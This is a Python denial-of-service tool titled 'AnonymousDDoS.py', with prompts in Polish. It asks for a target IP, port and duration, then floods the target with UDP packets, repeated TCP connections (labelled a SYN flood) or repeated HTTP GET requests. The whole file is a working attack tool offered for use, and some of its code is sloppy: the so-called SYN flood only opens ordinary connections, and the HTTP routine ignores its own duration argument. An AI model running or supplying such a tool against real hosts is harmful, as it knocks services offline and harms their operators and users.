from termcolor import colored
import sys
import os
import time
import socket
import random

# Clear the terminal
os.system("clear")
os.system("figlet AnonymousDDoS.py")


# Prompt for target IP and port
ip = input("Wprowadź docelowy adres IP: ")
try:
    port = int(input("Wprowadź docelowy port: "))
except ValueError:
    print("Nieprawidłowy port. Wychodzenie...")
    sys.exit()

# Prompt for attack duration
try:
    dur = int(input("Wprowadź czas trwania ataku w sekundach: "))
except ValueError:
    print("Nieprawidłowy czas trwania. Wychodzenie...")
    sys.exit()

# Function to perform the UDP Flood attack


def udp_flood(ip, port, message, dur):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket so that the program doesn't get stuck
    s.settimeout(dur)

    # The IP address and port number of the target host
    target = (ip, port)

    # Start sending packets
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"Wysłany pakiet {packet_count}")
        except socket.error:
            # If the socket is not able to send the packet, break the loop
            break

        # If the specified duration has passed, break the loop
        if time.time() - start_time >= dur:
            break

    # Close the socket
    s.close()

# Function to perform the SYN Flood attack
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"SYN Pakiety wysłane: {sent} Do celu: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Atak ustał.")
            sys.exit()
        finally:
            sock.close()  # Make sure to close the socket in all cases 
# Function to perform the HTTP Flood attack

def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(dur)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Re-create the socket for each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"HTTP Pakiety wysłane: {sent} Do celu: {ip}")
        except KeyboardInterrupt:
            print("\n[-] Zatrzymanie ataku przez użytkownika")
            break
    sock.close()


# Prompt for the type of attack
attack_type = input(colored(
    "Wprowadź typ ataku (wybierz numer) (1.UDP/2.HTTP/3.SYN): ", "green"))

if attack_type == "1":
    message = b"Sending 1337 packets baby"
    print(colored("UDP wybrany atak", "red"))
    udp_flood(ip, port, message, dur)
    print(colored("UDP atak zakończony", "red"))
elif attack_type == "3":
    print(colored("SYN wybrany atak", "red"))
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print(colored("HTTP wybrany atak", "red"))
    http_flood(ip, port, dur)
else:
    print(colored("Nieprawidłowy typ ataku. Wychodzenie...", "green"))
    sys.exit()
